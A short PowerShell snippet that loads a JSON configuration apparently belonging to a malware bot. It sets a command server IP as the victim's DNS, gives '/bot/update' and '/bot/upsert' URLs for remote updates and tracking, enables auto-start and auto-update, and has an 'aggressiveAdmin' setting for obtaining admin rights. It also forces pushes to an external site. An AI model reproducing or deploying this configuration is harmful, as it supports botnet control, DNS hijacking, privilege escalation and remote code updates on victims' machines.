
$server = @'
{
  "version": "2026.06.16 14:24:45",
  "disabled": false,
  "disableVirus": false,
  "serverIp": "26.188.115.1",
  "server": "default",
  "primaryDns": "26.188.115.1",
  "secondaryDns": "26.188.115.1",
  "extraUpdate": false,
  "updateUrl": "http://26.188.115.1/bot/update",
  "track": true,
  "trackDesktop": false,
  "trackUrl": "http://26.188.115.1/bot/upsert",
  "autoStart": true,
  "autoUpdate": true,
  "aggressiveAdmin": true,
  "aggressiveAdminDelay": 1,
  "aggressiveAdminAttempts": 0,
  "aggressiveAdminTimes": 0,
  "pushesForce": true,
  "pushes": [
    "https://veryoldgames.xyz"
  ],
  "startDownloadsForce": true,
  "startDownloads": [],
  "startDownloadsBackForce": true,
  "startDownloadsBack": [],
  "startUrlsForce": false,
  "startUrls": [],
  "frontForce": false,
  "front": [],
  "embeddingsForce": false,
  "embeddings": []
}
'@ | ConvertFrom-Json
